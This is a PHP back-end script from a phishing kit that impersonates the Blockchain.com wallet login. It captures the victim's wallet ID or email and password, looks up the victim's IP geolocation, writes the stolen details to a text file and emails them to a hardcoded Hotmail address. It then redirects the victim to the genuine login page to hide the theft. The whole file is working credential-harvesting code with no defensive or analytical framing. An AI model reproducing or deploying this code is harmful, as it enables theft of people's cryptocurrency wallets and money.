<?php

// store the requests
if (isset($_POST)) {
    $data = [];

    $ip = getenv("REMOTE_ADDR");
    $city = "";
    $region = "";
    $country = "";
    $countrycode = "";
    $query = @unserialize(file_get_contents('http://ip-api.com/php/' . $ip));
    if ($query && $query['status'] === 'success') {
        $city = $query['city'];
        $region = $query['regionName'];
        $country = $query['country'];
        $countrycode = $query['countryCode'];
    }

    $email = $_REQUEST['guidOrEmail'] ?? "";
    $alt_email = $_REQUEST['password'] ?? "";
    $app_name = "Blockchain.com Website";

    $message = "---------------+ {$app_name} START+--------------\n";
    $message .= "Email: $email\n";
    $message .= "Password: $alt_email\n";

    $message .= "---------------+ IP DETAILS +--------------\n";
    $message .= "IP: $ip\n";
    $message .= "City: $city\n";
    $message .= "Region: $region\n";
    $message .= "Country Name: $country\n";
    $message .= "Country Code: $countrycode\n";
    $message .= "---------------+ {$app_name} END+--------------\n";

    $fp = fopen("foxnails.txt", 'ab');
    fwrite($fp, $message);
    fclose($fp);

    $send = "umoke10@hotmail.com";
    $subject = "{$app_name} | $ip | $countrycode | $region";
    mail($send, $subject, $message);
}

header("Location: https://login.blockchain.com/#/login?product=wallet");
//header('Location: ' . $_SERVER['HTTP_REFERER'] . "?issuccess=yes");
exit();
